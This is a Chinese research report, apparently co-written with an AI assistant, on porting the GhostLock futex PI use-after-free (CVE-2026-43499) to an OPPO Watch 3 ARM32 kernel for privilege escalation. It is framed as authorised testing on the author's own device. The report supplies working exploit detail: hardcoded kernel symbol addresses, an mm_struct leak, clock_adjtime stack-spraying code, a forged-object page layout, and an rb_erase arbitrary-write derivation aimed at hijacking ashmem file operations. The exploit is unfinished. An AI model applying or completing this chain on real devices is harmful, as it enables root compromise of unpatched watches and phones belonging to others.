# GhostLock（CVE-2026-43499）在 OPPO Watch 3（OWW212，ARM32 / Linux 5.4.134）上的移植与利用可行性研究

**作者**：Qoder（研究协助）／设备所有者本人（授权安全研究）
**目标设备**：OPPO Watch 3，型号 OWW212，序列号 688e2740（自有设备）
**固件**：OWW212_11_A.142，`Linux 5.4.134-perf-00522-gb29f81177a79 SMP PREEMPT`
**实验数据采集日期**：2026-10-11（本机时钟），报告撰写日期：2026-10-14
**研究性质**：内核权限提升漏洞的跨架构移植与逐位验证；**非破坏性、可恢复（硬复位）探针**

---

## 摘要

本研究将 2026 年公开的 Linux futex 优先级继承（PI）requeue 路径栈上使用后释放（UAF）漏洞 CVE-2026-43499（俗称 GhostLock，原始 PoC 面向 ARM64/4.14 平台）移植到一款 **无 root、Bootloader 锁定、SELinux Enforcing、无 KASLR 的 ARM32（armv7l）智能手表内核**（Qualcomm W5+ Gen 1 "MONACO"，Linux 5.4.134-perf）。

工作分为四层：（1）从设备 OTA 包中离线抽取 `Image` 内嵌的 `CONFIG_KALLSYMS_ALL` 符号表，重建与运行内核完全一致的 System.map，从而把所有结构偏移与函数地址"烘焙"进目标头文件；（2）用 KernelSnitch 风格的 hsearch 哈希碰撞探针在 ARM32/FLATMEM 上完成 `mm_struct` 泄露，获得一个**已知可读可写的 4 KiB 内核页**；（3）构造"幽灵 waiter"（在 `futex_lock_pi` 的 EDEADLK 错误路径上遗留的悬垂 `task->pi_blocked_on`），并证明 `clock_adjtime()` 的 `copy_from_user` 窗口可以精确重写该栈帧；（4）把 `rt_mutex_adjust_prio_chain()` 的整条走链在真实设备反汇编层面建模，设计"安全页"（walksafe）使走链在不产生非预期写的前提下完成**一次可控单次写**。

本文的核心实证贡献是一次**指纹探针实验**：把 `clock_adjtime` 缓冲区的每个字写成 `0x100+4w`，随后内核Oops 中 `r5 = 0x12c`，由 `_raw_spin_trylock` 解引用。该单一观测同时证明了"写窗口确实落在幽灵 waiter 上"与"waiter 基址偏移 `W_BASE = 4`（与静态帧深度推导完全一致）"，把此前只能靠"没panic"猜测的几何问题变成了可判定问题。

**当前状态（诚实结论）：设备尚未取得 root，`id -u` 仍为 2000。** 走链在实机上确实被触发并抵达步骤 [5]（自旋锁 trylock），但一旦 `waiter->lock` 被植成我方页内合法地址，设备表现为**静默挂死**而非 Oops：约 15 s 后由 `CONFIG_QCOM_SOC_WATCHDOG`（`BARK_TIME=15000`）硬复位，且 pstore 内容逐字节不变。本文给出该现象的主假说（`_raw_spin_trylock` 失败后进入 `cpu_relax(); goto retry;` 无穷循环，根因可能是页在 PREP 与 punch 之间约 8 s 的间隔中被回收）以及一套可判读的定位实验（毒字阶梯）。

**关键词**：CVE-2026-43499；GhostLock；futex PI；rt_mutex；使用后释放；ARM32；KernelSnitch；kallsyms 离线抽取；OPPO Watch 3；无 KASLR；QCOM SoC watchdog

---

## 1 引言

### 1.1 背景

智能手表厂商普遍使用深度裁剪的 Linux 5.4 LTS 内核，其安全更新周期远落后于主线。GhostLock 类漏洞的价值在于：它只需要**普通应用/adb shell 权限**（本例 uid=2000，`CapEff=0`），且触发原语是 POSIX 线程优先级继承这一所有 Android 设备都启用的功能（`CONFIG_FUTEX_PI=y`）。

在 ARM64/4.14 平台上，同类利用已有公开实现（作者参考了 PCKM00 端口的既有设计）。但 ARM32 + 5.4 + 无 KASLR + 高通 MONACO 这一组合带来若干实质性差异：结构体尺寸不同、红黑树颜色位的编码方向、厂商在关键比较处插入的 `udf` 硬加固、`CONFIG_CPU_SW_DOMAIN_PAN` 使任何用户态地址都不能被内核解引用，以及**完全没有 LOCKUP_DETECTOR/HUNG_TASK/PSTORE_CONSOLE**，使得失败表现为无日志的静默复位。本文的绝大部分篇幅用于把这些差异逐一实测封闭。

### 1.2 研究范围与硬性约束

本研究的边界由设备所有者的安全底线决定，且在整个实验过程中未被违反：

1. **Bootloader 保持锁定，绝不执行任何解锁操作。** 在该平台上解锁被判定为 fastboot 不可逆的变砖事件（无法回刷），因此任何"需要解锁"的路线（包括但不限于修改 boot 镜像、刷入自定义 recovery）都被排除。允许的唯一"损失"是内核 panic/看门狗导致的重启——因为它们可通过回刷官方固件恢复。
2. 仅针对**自有设备**；所有探针都设计为在失败时退化为一次重启。
3. 不使用错误版本固件的符号（A.90 的 blob 曾被拒绝）：**版本横幅（banner）是符号有效性的唯一闸门**。
4. 结构偏移以设备自身配置（`/proc/config.gz` → `autoconf.h`）与设备自身内核镜像的 kallsyms 为准；公版 5.4 源码仅用于理解语义与函数内部流程。
5. 不擅自恢复出厂设置/擦除用户数据。

### 1.3 主要贡献

1. **可迁移的离线符号重建方法**：从 OTA 全量包 → `boot.img` → `Image` → `CONFIG_KALLSYMS_BASE_RELATIVE` 格式的 kallsyms 抽取，得到与运行内核逐字节一致的 System.map；并用"三方一致"（离线映射 ↔ 烘焙常量 ↔ 设备运行时日志）交叉校验。
2. **ARM32 栈帧几何的决定性测量**：指纹探针（fingerprint probe）把"写窗口与幽灵 waiter 的相对位置"从假设变为单次可判读实验，实测 `W_BASE = 4`，并给出幽灵地址 `stack_top − 320` 的可复现性。
3. **走链的指令级控制流建模**：把 `rt_mutex_adjust_prio_chain`（`c0196c4c`）在 A.142 上的 24 个关键基本块与作者构造的假对象页对应起来，明确指出 trylock 失败分支即死循环风险点。
4. **静默失败的分类学**：建立"Oops 必留 ramoops、挂死不留"的判别法，用 pstore 的 md5 不变 + dropbox 无 `SYSTEM_LAST_KMSG` + 15 s 复位时间三个独立信号区分两类死亡。
5. **一份完整的负结果记录**：包括被否证的假说（`W_BASE` 错配、`GHOSTLOCK_STACK_PAD` 有效、写目标选择是致命因素），这些假说的否证过程本身就是方法学贡献。

### 1.4 结论先行

截至本报告：漏洞可达性（触发、UAF 成形、写窗口命中、走链启动）已**全部实证**；单次可控写的落地尚未成功，障碍收敛到走链中段的一个挂死点。第 10 节给出可判读的单步定位方案。

---

## 2 目标平台与安全缓解实测

### 2.1 设备与运行环境

| 项目 | 实测值 | 获取方式 |
|---|---|---|
| 型号/硬件 | OWW212，`Qualcomm Technologies, Inc. MONACO (Flattened Device Tree)` | ramoops 中的 `Hardware name:` 行 |
| SoC | Snapdragon W5+ Gen 1，8 CPU | `sysconf(_SC_NPROCESSORS_ONLN) = 8` |
| 架构 | ARMv7（`CONFIG_CPU_V7=y`，ARM 指令集，非 THUMB2） | `config` + Oops `Mode SVC_32 ISA ARM` |
| 内核 | `5.4.134-perf-00522-gb29f81177a79 #1 PREEMPT SMP ARM` | `uname` / ramoops |
| 固件 | OWW212_11_A.142 | `ro.build` 属性 |
| 进程上下文 | `uid=2000 gid=2000 euid=2000`，`attr=u:r:shell:s0`，`enforce=1` | 探针启动自检日志 |
| 能力/沙箱 | `NoNewPrivs=0`，`Seccomp=0`（adb shell 域无 seccomp） | 启动自检日志 |
| dm-verity | 关闭 | 分区状态检查 |
| 地址布局 | `PAGE_OFFSET=0xC0000000`（VMSPLIT_3G）、`PHYS_OFFSET=0x80000000`、`_text=0xC0008000`、`_stext=0xc0100000` | 镜像 + `p0 profile` 日志 |
| ADB | `C:\platform-tools\adb.exe`，设备序列号 688e2740 | — |

### 2.2 与利用直接相关的内核配置

| 配置项 | 取值 | 对本利用的含义 |
|---|---|---|
| `CONFIG_FUTEX` / `CONFIG_FUTEX_PI` | y / y | 漏洞入口存在 |
| `CONFIG_RT_MUTEXES` | y（隐含） | PI 走链可达 |
| `CONFIG_DEBUG_RT_MUTEXES` | 未设 | waiter 无 `wake_state`，`lock` 字段在 +0x1c（若开启则布局不同） |
| `CONFIG_KALLSYMS_ALL` / `CONFIG_KALLSYMS_BASE_RELATIVE` | y / y | **离线抽取符号表的依据** |
| KASLR | 不存在（镜像不可重定位） | 所有 `.text`/`.data` 地址为常量，跳过 slide 阶段 |
| `CONFIG_CPU_SW_DOMAIN_PAN` | y | **禁止**用用户态地址充当伪造内核指针 |
| `CONFIG_STRICT_KERNEL_RWX` | y | `fops` 表在只读段，只能改指针不能改代码 |
| `CONFIG_STACKPROTECTOR_STRONG` | y | 与本研究无直接阻断：破坏目标是栈上的**数据结构**，不越过 canary |
| `CONFIG_CGROUP_SCHED` / `CONFIG_UCLAMP_TASK` | y / y | 提供 `sched_setattr` + util-clamp 这一"prio 恒定"的重复走链触发器 |
| `CONFIG_LOCKUP_DETECTOR` / `SOFTLOCKUP_DETECTOR` / `HUNG_TASK` | 未设 | **挂死不产生任何日志** |
| `CONFIG_PSTORE` / `PSTORE_RAM` | y / y | `dmesg-ramoops-0` 跨重启保留完整 dmesg |
| `CONFIG_PSTORE_CONSOLE` | 未设 | 实时 console 不落 pstore，只能看崩溃前已写入的环形缓冲 |
| `CONFIG_QCOM_SOC_WATCHDOG` / `QCOM_WATCHDOG_BARK_TIME` | y / **15000** | 挂死 → 15 s 后硬复位，且无 pstore 记录 |
| `CONFIG_ASHMEM` | y | hijack 候选槽位（`misc->fops`） |
| `CONFIG_BUG` | y | `udf` 加固指令可被用作故障定位信标 |

### 2.3 无 KASLR 的战术含义

无 KASLR 带来两个相反方向的影响。有利的一面：所有 `.data` 目标（`sysctl_optmem_max = 0xc1a08a04`、`ashmem_misc = 0xc1aa8808`、`console_printk = 0xc1a1d174`、`init_task = 0xc1a112c0`）在编译期即为常量，无需任何基址泄露即可精确瞄准；`commit_creds = 0xc0148c60`、`prepare_kernel_cred = 0xc0148fe4` 同理。不利的一面：**任何一次瞄准错误的写都会命中真实且重要的内核数据**，容错窗口比有 KASLR 的平台更小，因此本工作把"先证明走链路径可控，再落地真实写"作为强制次序。

---

## 3 漏洞原理：CVE-2026-43499 与"幽灵 waiter"

### 3.1 机理概述

`futex_lock_pi()` 在获取 rt_mutex 失败并需要走 PI（优先级继承）路径时，会在**调用者的内核栈上**分配一个 `struct rt_mutex_waiter`，把它挂入锁的 waiters 树，并记录 `current->pi_blocked_on = &waiter`。在特定的错误返回路径（本例经由 `futex_requeue` 引发的 EDEADLK 自锁检测）上，内核会 `remove_waiter()` 释放栈上 waiter 并**返回错误**，但作者观测到的行为是：该错误路径清理的是**重排队方（requeue 发起者）**的 waiter，而 `current->pi_blocked_on` 仍指向上一次 `futex_lock_pi` 已经随栈帧弹出而失效的 waiter 对象。

于是得到一个悬垂指针型 UAF：

```
task->pi_blocked_on  ──►  （已弹出的内核栈区域，可被后续任意系统调用复用写入）
```

任何后续调用 `rt_mutex_adjust_pi(task)` / `rt_mutex_setprio()` 的代码路径都会**解引用这个悬垂指针**，并把栈上那块内存当作合法的 `rt_mutex_waiter` 使用。若攻击者能在解引用之前把该内存内容改写为自己构造的 waiter，就得到"以攻击者选择的 `waiter->lock`、`waiter->tree_entry`、`waiter->prio` 进入走链"的强原语——这正是单次任意写 `*(W) = V` 的入口。

### 3.2 本实现的触发序列

```
线程 owner  : FUTEX_LOCK_PI 持有 pi_lock（rt_mutex A）
线程 route  : FUTEX_LOCK_PI 阻塞在 A 上，其栈帧内出现 waiter W_A，
              task->pi_blocked_on = &W_A
requeue     : 对 route 所在线程组执行 FUTEX_REQUEUE/CMPReQUEUE，
              使 PI 链在自锁检测处返回 -EDEADLK，
              route 的 futex_lock_pi 提前退出，栈帧弹出，
              但 owner task 的 pi_blocked_on 悬垂指向 &W_A 的原位置
ghost 形成  : 此后任何 rt_mutex_adjust_pi(owner) 都会读那块栈
```

实机证据（每次 fire 均稳定复现，摘录自 `captures/wsself.log`）：

```
[16:29:40.668] REQUEUE-PI ret=-1 errno=35 (EDEADLK: ghost pi_blocked_on formed)
```

`errno = 35` 即 `EDEADLK`，返回 `-1` 说明 `futex_lock_pi` 正是在 PI 自锁检测失败的错误路径上退出——这是"幽灵已经成形"的正向信号，而不是失败信号。任何一次 fire 若没有这一行，就说明 UAF 前提根本没建立，后续全部实验无意义。

### 3.3 punch（走链触发器）的选择

需要" prio 恒定、可重复、不产生睡眠"的走链触发器。本实现使用 `sched_setattr()` + `CONFIG_UCLAMP_TASK` 的 util-clamp 修改：它会让目标 task 的 `->prio` 保持不变（120），却仍调用 `rt_mutex_adjust_pi()`，从而：

* 每次 punch 都走到同一条分支（可重复）；
* 不会唤醒/阻塞目标线程，不引入额外调度噪声；
* 与旧式 `setpriority` 触发相比，避免了 prio 抖动导致的分支发散。

日志证据：`PUNCH-TGT mode=waiter tid=8191 waiter=8191 owner=8192`，以及 `TARGET-PRE a=1 tid=8191 prio=120 nice=0 plant_val=120 auto=1`。

---

## 4 ARM64/4.14 → ARM32/5.4 的移植差异

| 维度 | ARM64 参考实现（PCKM00, 4.14） | 本研究（OWW212, 5.4 ARM32） | 后果 |
|---|---|---|---|
| 指针宽度 | 8 字节 | **4 字节** | 所有偏移/布局重算；`rb_node` 12 字节而非 24 |
| `rt_mutex_waiter` | 含 `wake_state`/`ww_ctx`（5.5+） | **无**，尺寸 0x30 | `task@0x18 lock@0x1c prio@0x20 deadline@0x28` |
| rbtree 颜色位 | 同 | 同，但**方向反直觉**：`RB_RED=0, RB_BLACK=1`（`rbtree_augmented.h`） | 早期所有 `entree base<=2` 的失败源于此：`pc=0` 被当作 RED，`__rb_insert` 取 `gparent = pc & ~3 = NULL` 并解引用 → 必崩 |
| 厂商加固 | 无 | `c019718c / c0197194` 处 `udf` 断言（waiter->lock 一致性） | 必须让 `waiter->lock == fake_lock`，且 `fake_w0->lock == fake_lock` 才能绕过 |
| 用户地址隔离 | `PAN` | `CONFIG_CPU_SW_DOMAIN_PAN=y` | 伪造指针必须是**内核地址**（只能用泄露页） |
| KASLR | 有（需 slide 泄露） | **无** | 跳过 slide；`.data` 地址常量 |
| slab/回收对象 | `mm_struct` order-3 | `mm_struct` size 0x200、**order-0、objs_per_slab=8** | 全部伪造对象必须压进**同一个 4 KiB 页**内 |
| `thread_info` | 在 `task_struct` 内（THREAD_INFO_IN_TASK=y） | **不在** task 内，位于栈底（`task->stack`） | 走链若进入 `__task_rq_lock` 会读 `p->stack->cpu`；`stack=0` 必崩，故指向页内零字 |
| 挂死可观测性 | LOCKUP_DETECTOR 通常开启 | 全关 + SoC 看门狗 | 失败模式退化为"无日志复位"，需新判别法（§9） |

### 4.1 伪造页内布局（`target.h`，单页 4 KiB）

```
payload_base + 0x0000 : fake_task（task_struct 前若干字段的切片）
payload_base + 0x0600 : fake_w0（第二个 waiter，树形关系的载体）
payload_base + 0x0700 : fake_lock（rt_mutex：wait_lock@0, waiters@4/8, owner@0xc）
payload_base + 0x0800 : right node（rb_node）
payload_base + 0x0900 : left node（rb_node）
payload_base + 0x0A00 : fake file_operations 表（约 0x100 字节）
payload_base + 0x0E00 : SCRATCH（用作 fake_task->stack 等"读零"用途）
```

因为泄露对象是 order-0 slab，`payload_base = leaked_mm & ~0xFFF` 是唯一**已知被完全控制**的页，所有结构必须自洽地落在 `[payload_base, payload_base+0x1000)`。

### 4.2 一处重要更正：`task->pi_lock` / `pi_blocked_on` 的真实偏移

`target.h` 中 `FAKE_TASK_PI_LOCK_OFF=0x570`、`FAKE_TASK_PI_BLOCKED_ON_OFF=0x584` 是沿袭 ARM64/5.10 推导的**陈旧常量**。设备反汇编给出实测值：

```
c0196d84  ldr r6, [r4, #0x6c8]      ; r4 = task, r6 = task->pi_blocked_on
```

并在两次独立 Oops 的寄存器组中得到交叉验证：`r4 = 0xd9959000`（task 基址）、`r7 = 0xd99596b4 = r4 + 0x6b4`（`&task->pi_lock`）、`r6 = 0xc4b25ec0`（waiter 指针）。因此本研究的活路径使用 **0x6b4 / 0x6c8**。该更正只影响读侧（走链自己取字段），不影响假页里给走链看的字段——但任何后续把 `pi_blocked_on` 当作可写槽位的做法都必须用 0x6c8。

---

## 5 内核基址与对象泄露（KernelSnitch 风格）

### 5.1 原理

`task_struct` 泄露的 `task->mm` 指针通过 `clone()` 子进程继承关系在多进程间复制，利用 `hsearch`（glibc）哈希表的插入顺序与地址高位可构造碰撞，进而用子进程的 `mm->mmap` 等字段读取"同一 slab 上其他对象"的内容，最终在 `[0xC0000000, 0xF0000000)` 的低映射窗口内定位一个 `mm_struct`。

### 5.2 实测参数与日志

在 ARM32 上重算的关键参数（`[*] parameters` 行）与命中结果：

```
[16:29:38.197] [*] parameters cpu (8) mm_struct sz (200) mm slab order (0)
                          thread cnt (4) collisions (4) mte disabled
[16:29:38.687] [*] start finding collisisons
[16:29:38.694] [*] target    b65890a4
[16:29:38.902] [*]   b1ede8a8
[16:29:39.866] [*]   b25acf18
[16:29:40.125] [*]   b2744bd8
[16:29:40.131] [*] found 3 collisisons
[16:29:40.434] [*] [  0] HIT model=1 hsz=256 mm=c4344600
[16:29:40.444] PREP base=c4344000 objs_per_slab=8 prepare=256 spray=48
                  pre=7 post=8 leaked_mm=c4344600
```

其中 `HIT model=1 hsz=256` 是泄露模型收敛的判据（与先前记忆一致：mainline hash 模型=1、`futex_hashsize=256`、`mm` 步长 0x200）。多个实验日期的 ghost/页地址均显示该阶段稳定成功。

泄露成功后，`payload_base = c4344000`（页对齐），`fake_task = c4344000`，`fake_lock = c4344700`，`fake_fops = c4344a00`——三者全在同一受控页内。

---

## 6 写原语：`clock_adjtime(405)` 的用户→内核栈复制窗口

### 6.1 帧深度分析（离线，基于 `Image.a142`）

```
sys_clock_adjtime  = 0xc01d34a4 : 帧大小 248 字节，`struct timex ktx` 位于 sp+0
copy_from_user(&ktx, utx, sizeof(ktx)=0xd0=208) 发生在任何回调之前
clockid = 12345 >= MAX_CLOCKS(16) → clockid_to_kclock() 返回 NULL
        → do_clock_adjtime() 立即返回 -EINVAL：
          * 不调用任何 k_clock 回调
          * 更关键的是它在 copy_to_user 回写之前就返回，
            因此轮询 405 期间不会再有第二次触碰用户缓冲
```

于是 `ktx` 的 208 字节全部为用户可控内容，落在相对系统调用入口 `S0` 的深度 `[40, 248)`。幽灵 waiter（12 个字，word0 在最深 232）位于深度 `[184, 232)`，覆盖判据 `D ≥ 232 且 D − L ≤ 184` 成立（248 ≥ 232，248 − 208 = 40 ≤ 184）。字对应关系：waiter 第 k 字在深度 `232 − 4k`，ktx 第 j 字在深度 `248 − 4j`，故 **ktx 字 (4 + k) == waiter 字 k**，即 `W_BASE = 4`（静态预测）。

### 6.2 植字代码（`exploit/src/fops.c`，walksafe 模式）

```c
/* 每个 punch 前由 prepare_adjtime_buf() 重排 buf[]，随后 405 轮询把
 * buf 复制进内核栈，覆盖幽灵 waiter 的 12 个字。 */
adjtime_put_global_word(buf, wbase + WT_W_TREE_PC, w - 4);  /* tree.parent_color */
adjtime_put_global_word(buf, wbase + WT_W_TREE_R , v     ); /* tree.rb_right      */
adjtime_put_global_word(buf, wbase + WT_W_TREE_L , 0     ); /* tree.rb_left       */
adjtime_put_global_word(buf, wbase + WT_W_PI_PC  , 0     ); /* pi_tree.*  —— owner==0 时 [11] 不执行 */
adjtime_put_global_word(buf, wbase + WT_W_PI_R   , 0     );
adjtime_put_global_word(buf, wbase + WT_W_PI_L   , 0     );
adjtime_put_global_word(buf, wbase + WT_W_TASK   , fake_task );  /* 仅供被刻意绕开的 wake_up_process */
adjtime_put_global_word(buf, wbase + WT_W_LOCK   , fake_lock );  /* 必须 == fake_lock，否则 udf 加固触发 */
adjtime_put_global_word(buf, wbase + WT_W_PRIO   , 0     );      /* 0 => 必不等(120/139) => 走链真的执行 */
```

目标选择（`GHOSTLOCK_WS_TARGET`）三选一：`self`（写落在自家页内，纯路径验证）、`oracle`（写落在 `sysctl_optmem_max`，可用 `/proc/sys/net/core/optmem_max` 读回做正向验证）、`fops`（写落在 `ashmem_misc.fops`，即真正的 hijack 槽位）。

轮询循环本身保证"植物新鲜度"：在 punch 之前，同一缓冲区每约 0.3 µs 重新复制一次，因此幽灵区域的内容在 punch 瞬间必然等于我方最后一次写入。

---

## 7 几何测量：指纹探针实验（本研究最关键的一次实证）

### 7.1 方法

把整个用户缓冲写成自带地址信息的等差数列，使内核 Oops 的寄存器值直接"报出"被读到的是第几个字：

```c
if (env_flag("GHOSTLOCK_PATTERN", 0)) {
  for (int w = 0; w < ADJTIME_TIMEX_WORDS; w++)   /* 52 words */
    buf[w] = (uint32_t)(0x100 + 4 * w);
  return;
}
```

这个构造的好处是**非破坏性自解释**：任何被内核当作指针使用的值都能反解出 `w = (v − 0x100)/4`。

### 7.2 观测

```
<1>[  827.728855] Unable to handle kernel NULL pointer dereference at virtual address 0000012c
<0>[  827.728871] Internal error: Oops: 5 [#1] PREEMPT SMP ARM
<4>[  827.728915] CPU: 1 PID: 8370 Comm: toybox Tainted: G        W  O   5.4.134-perf-00522-gb29f81177a79 #1
<4>[  827.728918] Hardware name: Qualcomm Technologies, Inc. MONACO (Flattened Device Tree)
<4>[  827.728928] PC is at _raw_spin_trylock+0x20/0x90
<4>[  827.728935] LR is at rt_mutex_adjust_prio_chain+0x120/0x558
<4>[  827.728949] r7 : e1ff96b4  r6 : c7e19ec0  r5 : 0000012c  r4 : e1ff9000
<4>[  827.728953] r3 : 00000000  r2 : c7c14004  r1 : 00000003  r0 : 0000012c
```

对应的用户侧日志（同一次 fire）：

```
[16:10:49.423] PRE-ATDFI a=1 wbase=0 mode=000 probe=-9,-9 val=120 plant=0 pad=0 ...
              buf[wbase+0..8]=00000100 00000104 00000108 0000010c 00000110
                              00000114 00000118 0000011c 00000120
```

### 7.3 推导（一步一果）

1. `r5 = 0x12c`，而 `0x12c = 0x100 + 4·11` → 内核读到的是 **`buf[11]`**。这是我方写入的指纹值本身，证明"内核读到的内存 = 我方刚复制进去的内容"。
2. 走链在 `c0196d64 mov r0, r5` 之前已经把 `r5` 设为 `waiter->lock`，因此 `waiter->lock` 字段与 `buf[11]` 重合，即 **`addr(buf[11]) = ghost + 0x1c`**。
3. 于是 `addr(buf[0]) = ghost − 0x10`，`addr(buf[4]) = ghost`。**幽灵 waiter 基址 = `buf[4]`，即 `W_BASE = 4`**，与 §6.1 的静态帧深度预测完全一致（独立验证）。
4. 同一次 fire 中 `r6 = ghost = 0xc7e19ec0`；更早一次 fire 中 `r6 = 0xc4b25ec0`。两者都满足 **`ghost = stack_top − 320`**（`0xc7e19ec0 + 0x140 = 0xc7e1a000`，`0xc4b25ec0 + 0x140 = 0xc4b26000`）。即幽灵地址在跨 fire、跨重启的意义上是**结构稳定**的（其绝对值随该线程栈而变，但相对关系固定）。
5. 顺带否证：先前怀疑"对齐错误导致读到陈旧值"以及"`GHOSTLOCK_STACK_PAD`（用户态 alloca）可以移动内核 sys_clock_adjtime 帧"两条假说均不成立——后者对内核帧尺寸毫无影响，已从所有命令中移除。

### 7.4 这次实验同时封闭的两个问题

* **可达性**：走链在实机上确实执行到步骤 [5]（`_raw_spin_trylock`），说明 `rt_mutex_adjust_pi` 入口判定通过（`waiter->prio` 不等 → 不走 bail）。
* **新鲜度**：内核读取的就是我方最后一次 `clock_adjtime` 复制的内容，而不是残留栈垃圾。

后者尤其重要：早前一次 fire（oracle 目标）中 `r5 = 0x00000002`，当时被解读为"写窗口错位"，实际是**旧构建**的产物：

```
<3>[ 4265.019239] Alignment trap: not handling instruction e1902f9f at [<c0faea40>]
<1>[ 4265.019254] Unhandled fault: alignment exception (0x001) at 0x00000002
<4>[ 4265.019337] PC is at _raw_spin_trylock+0x24/0x90
<4>[ 4265.019363] r7 : d99596b4  r6 : c4b25ec0  r5 : 00000002  r4 : d9959000
```

`e1902f9f` 即 `ldrex r2, [r0]`（`_raw_spin_trylock+0x20`），对 `0x2` 做排除性访问产生对齐陷阱。`r5 = 2` 说明那一版走链读到的是**未被植物覆盖**的字段；指纹实验证明现在的构建已无此问题。

---

## 8 走链的指令级建模与安全页设计

### 8.1 入口判定（`kernel/locking/rtmutex.c: rt_mutex_adjust_pi()`）

```
raw_spin_lock_irqsave(&task->pi_lock);
waiter = task->pi_blocked_on;
if (!waiter || rt_mutex_waiter_equal(waiter, task_to_waiter(task))) { unlock; return; }
next_lock = waiter->lock;
raw_spin_unlock_irqrestore(&task->pi_lock);
get_task_struct(task);
rt_mutex_adjust_prio_chain(task, RT_MUTEX_MIN_CHAINWALK, NULL, next_lock, NULL, task);
```

两个关键推论（在实机日志/寄存器中得到确认）：

* `orig_waiter == NULL`，因此走链内部的 `task_has_pi_waiters()` / `task_top_pi_waiter()` 检查被跳过；
* 植字 `waiter->prio = 0` 与 `task_to_waiter(task)->prio = 120` 不等，`rt_mutex_waiter_equal()` 必然失败，走链**必然执行**（对应反汇编 `c0196d14/c0196d18` 比较后 `bne c0196d64`，以及 Oops 中 `r8 = 0x00000001` 即 `requeue = true`）。

### 8.2 `rt_mutex_adjust_prio_chain`（`c0196c4c`，尺寸 0x558）关键基本块映射

| 地址 | 指令（实测反汇编） | 语义 | 我方布局如何满足 |
|---|---|---|---|
| `c0196d14/18` | `ldr r1,[r4,#0x34]` / `ldr r0,[r6,#0x20]` | `task->prio` vs `waiter->prio` | prio 植 0 ⇒ 不等 ⇒ `bne c0196d64` |
| `c0196d64` | `mov r0, r5` | r0 = `waiter->lock` | 植 `fake_lock`（页内、4 字节对齐） |
| `c0196d68` | `bl c0faea20` | `_raw_spin_trylock(waiter->lock)` | `fake_lock` 的 `wait_lock` 字写 0 ⇒ 应获得锁 |
| `c0196d6c/70` | `cmp r0,#0` / `bne c0196d94` | 成功 → 继续；失败 → 走 else | **失败分支即死循环风险（§9.3）** |
| `c0196d74–c0196d90` | `bl c0faed30`(`_raw_spin_unlock_irq`) / `bl c0faebd4`(`_raw_spin_lock_irq`) / `ldr r6,[r4,#0x6c8]` / `cmp r6,#0` / `bne c0196cb4` | 重取 pi_lock、重读 `pi_blocked_on`、`goto retry` | 若 `pi_blocked_on` 恒非 NULL 且 trylock 恒失败 ⇒ 形如 `cpu_relax(); goto retry;` 的无穷循环 |
| `c0196d94–c0196dac` | `ldr r0,[sp,#8]`（orig_lock=NULL）/ `ldr sl,[sp,#0x34]`（top_task）/ `cmp r5,r0` / `ldrne r0,[r5,#0xc]; bicne #1; cmpne r0,sl; beq c019710c` | owner 自锁检测（EDEADLK） | owner 植 0 ⇒ `cmp r5,r0` 不等 ⇒ 读 `[fake_lock,#0xc]=0`，`0 != task` ⇒ 不跳 EDEADLK |
| `c0196db0` | `tst r8,#1` | requeue 分支 | r8=1 ⇒ 进入 |
| `c0196db8` | `ldr r0,[r5,#8]` | `lock->waiters.rb_leftmost`（rb_root_cached 第二字） | = `fake_w0` |
| `c0196dc4 / dcc / dd0` | `ldr r1,[r0,#0x1c]` / `cmp r1,r5` / `beq c0196e78` | top_waiter 的 `lock` 必须等于 `waiter->lock` | `fake_w0->lock` 植 `fake_lock` ⇒ 相等 ⇒ 跳过厂商 `udf`（`b c019718c`） |
| `c0196e78` | `ldr r1,[r6]; cmp r1,r6; beq c0196ea4` | `RB_EMPTY_NODE(&waiter->tree_entry)`：若幽灵已自清则跳过 dequeue | 植 `tree_pc = W−4 ≠ ghost` ⇒ **不为空 ⇒ dequeue 执行**（写 where 的前提） |
| `c0196e84–c0196e90` | `cmp r0,r6` / `bl rb_next` / `str r0,[r5,#8]` | 仅当被摘节点是 leftmost 时重算 leftmost | top_waiter = `fake_w0` ≠ 幽灵 ⇒ 跳过 |
| `c0196e94` | `bl c0f9af3c`（`rb_erase`） | **唯一的"写 where"点**：`*(W)=V` 然后 `*(V)=W−4` | tree_pc/r/l 决定 W、V |
| `c0196ea0` | `str r6,[r6]` | `RB_CLEAR_NODE`（写自身，页内安全） | ghost+0 写 ghost+0，落在栈上，无害 |
| `c0196ea8` | `str task->prio → ghost+0x20` | 更新 waiter prio | 页/栈内 |
| `c0196ec0` | `bl c0197ae8`（`rt_mutex_enqueue`） | 把栈 waiter 重新插入 `fake_lock` 的树 | 见 §8.3 |
| `c0196ee4` | `ldr r0,[r5,#0xc]; cmp r0,#1; bls c0197144` | `[9]` owner ≤ 1 ⇒ 提前退出 | **owner 植 0 ⇒ 在 [9] 退出，绝不进入 [10]/[11]** |
| `c019715c–c019716c` | `cmp sl,r0` / `bl c0faed30` | 跳过 `wake_up_process`、解锁并返回 0 | prerequeue == top_task ⇒ 不唤醒伪造 task |

### 8.2.1 单次可控写的来源：`rb_erase` 的单子节点分支（推导）

walksafe 植字为 `ghost.tree_pc = W−4`、`ghost.tree_r = V`、`ghost.tree_l = 0`，`root = &fake_lock->waiters.rb_root`（`fake_lock+4`，其 `rb_node = fake_w0`）。按 5.4 `lib/rbtree.c` 的 `__rb_erase_augmented()`：

1. `node->rb_left == 0` ⇒ `child = node->rb_right = V`（走"单孩子"分支，**不进入**两孩子的 `tmp` 分支）。
2. `parent = rb_parent(node) = (W−4) & ~3 = W−4`（`W` 为 4 字节对齐，故 `W−4` 的低两位为 0，颜色位为 **RED**）。
3. `__rb_change_child(node, child, parent, root)`：
   `if (parent->rb_left == node) parent->rb_left = child; else parent->rb_right = child;`
   其中 `parent->rb_left` 位于 `(W−4)+8 = W+4`，`parent->rb_right` 位于 `(W−4)+4 = W`。只要 `*(W+4) != ghost`（对所有真实内核对象恒成立），就走 else，于是
   **`*(W) = V`** ← 这就是我们要的那一次写。
4. `if (child) child->__rb_parent_color = node->pc;` ⇒ **`*(V) = W−4`**（第二写，落在 `fake_fops` 等自家页内地址，可接受）。
5. `__rb_copy_color` 与重平衡：被摘节点颜色为 RED ⇒ 返回 `rebalance = NULL` ⇒ **不调用 `rb_erase_color`**，不会向祖先/祖父扩散任何读写。

因此"一次 punch = 一次 `*(W)=V` + 一次 `*(V)=W−4` + 一次 `*(W+4)` 读"，其余全部落在幽灵栈帧自身（`str r6,[r6]`、`str r0,[r6,#0x20]`）。这也解释了为什么 phase 0 的 `V` 必须选在自家页：`*(V)=W−4` 会破坏 `V` 处的内容，`fake_fops` 是我们自己的表，破坏它无副作用；反之若把 `V` 指向内核 `.data`，就会造成第二处不可控写。

